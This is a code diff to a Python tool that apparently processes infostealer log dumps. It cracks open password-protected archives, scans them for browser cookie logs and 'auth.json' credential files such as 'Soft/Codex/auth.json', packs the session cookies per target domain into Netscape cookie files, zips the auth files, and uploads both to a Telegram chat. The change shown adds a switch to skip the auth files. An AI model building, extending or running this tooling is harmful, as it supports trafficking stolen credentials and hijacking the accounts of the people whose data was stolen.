@@ -568,7 +568,7 @@ def _extract(arc, out, pwds, filters):
     return False, ("wrong_password" if badpwd else "corrupt")
 
 # ── 3. cookie search on every core + packaging ──
-def search_pack(ex):
+def search_pack(ex, want_auth=True):
     """One tree walk collects both scan targets: cookie logs and auth.json."""
     files, auths = [], []
     for p in ex.rglob("*"):
@@ -578,11 +578,13 @@ def search_pack(ex):
             continue
         n = p.name.lower()
         if n == "auth.json":
-            auths.append(p)
+            if want_auth:
+                auths.append(p)
         elif n.endswith((".txt", ".log", ".cookie", ".cookies")):
             files.append(str(p))
     tot = len(files)
-    st("scan", 44, log_files=tot, cores=CORES, auth=len(auths))
+    st("scan", 44, log_files=tot, cores=CORES,
+       auth=len(auths) if want_auth else None)
     sess = {d: [] for d in DOMS}; seen = {d: set() for d in DOMS}
     if tot:
         size = 256          # small chunks: progress + cancellation stay live on huge trees
@@ -604,7 +606,8 @@ def search_pack(ex):
                         found_c += 1
                 tick("scan", 44 + min(scanned * 40 // max(tot, 1), 40),
                      scanned=scanned, log_files=tot, cores=CORES,
-                     workers=nw, sessions=found_c, auth=len(auths),
+                     workers=nw, sessions=found_c,
+                     auth=len(auths) if want_auth else None,
                      per_domain={d: len(v) for d, v in sess.items() if v})
     hdr = "# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n\n"
     packed = {}
@@ -612,23 +615,28 @@ def search_pack(ex):
         if not sessions_: continue
         pack_domain(d, sessions_, hdr)
         packed[d] = len(sessions_)
-    st("packed", 92, found=packed, auth=len(auths))
+    st("packed", 92, found=packed,
+       auth=len(auths) if want_auth else None)
     return packed, auths
 
 def pack_auth(auths):
-    """All auth.json files in one zip, folder layout preserved (Soft/Codex/auth.json)."""
-    if not auths: return None
-    zp = OUT / "auth_files.zip"
-    base = WORK / "ex"
+    """All auth.json files in one auth.zip, renamed 1st_auth.json, 2nd_auth.json…"""
+    if not auths: return None, []
+    zp = OUT / "auth.zip"
+    rels = []
     with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
-        for p in auths:
-            try:
-                rel = str(p.relative_to(base))
-            except Exception:
-                rel = p.name
-            try: z.write(str(p), rel)
+        for i, p in enumerate(auths, 1):
+            name = "%s_auth.json" % ordn(i)
+            try: rel = str(p.relative_to(WORK / "ex"))
+            except Exception: rel = p.name
+            rels.append((name, rel))
+            try: z.write(str(p), name)
             except Exception: pass
-    return zp
+    return zp, rels
+
+def ordn(n):
+    suf = "th" if 10 <= n % 100 <= 20 else {1: "st", 2: "nd", 3: "rd"}.get(n % 10, "th")
+    return "%d%s" % (n, suf)
 
 def pack_domain(dom, sessions_, hdr):
     """One zip per domain, split into parts under Telegram's 50 MB upload cap.
@@ -721,19 +729,16 @@ def deliver(packed, task):
     return sent, failed, links
 
 def deliver_auth(auths):
-    """Send every auth.json found as one zip, folder layout preserved."""
-    zp = pack_auth(auths)
+    """Send auth.zip (1st_auth.json, 2nd_auth.json…) to the chat."""
+    zp, rels = pack_auth(auths)
     if zp is None:
         return False
-    rels = []
-    for p in auths[:12]:
-        try: rels.append(str(p.relative_to(WORK / "ex")))
-        except Exception: rels.append(p.name)
+    shown = "\n".join(code("%s ← %s" % (n, r[:58])) for n, r in rels[:10])
     cap = (f"{gold_header('AUTH.JSON FILES', esc(str(len(auths)) + ' found'))}\n{THIN}\n"
            f"📦 {bold('Size')}   {code(fmt_size(zp.stat().st_size))}\n"
-           f"🗂 {bold('Layout')} folders kept, e.g. Soft/Codex/auth.json\n"
-           + "\n".join(code(r[:70]) for r in rels)
-           + ("\n…" if len(auths) > len(rels) else ""))
+           f"🗂 {bold('Names')}  1st_auth.json, 2nd_auth.json …\n"
+           + shown
+           + ("\n…" if len(rels) > 10 else ""))
     return upload(str(zp), cap)
 
 def finish(task, stage, **extra):
@@ -780,16 +785,18 @@ def process(task):
             finish(task, "error", err=why)
         return
     shutil.rmtree(WORK / "dl", ignore_errors=True)
-    packed, auths = search_pack(WORK / "ex")
+    packed, auths = search_pack(WORK / "ex", bool(task.get("auth")))
     if stop():
         shutil.rmtree(WORK, ignore_errors=True)
         finish(task, "cancelled", err="cancelled"); return
     sent, failed, links = deliver(packed, task)
-    auth_sent = deliver_auth(auths)
+    want_auth = bool(task.get("auth"))
+    auth_sent = deliver_auth(auths) if want_auth else False
     shutil.rmtree(WORK, ignore_errors=True)
     st("done", 100, job=task.get("job"), vm=SPECS)
     finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
-           failed=failed, links=links, auth=len(auths), auth_sent=auth_sent)
+           failed=failed, links=links, auth=len(auths) if want_auth else 0,
+           auth_sent=auth_sent)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
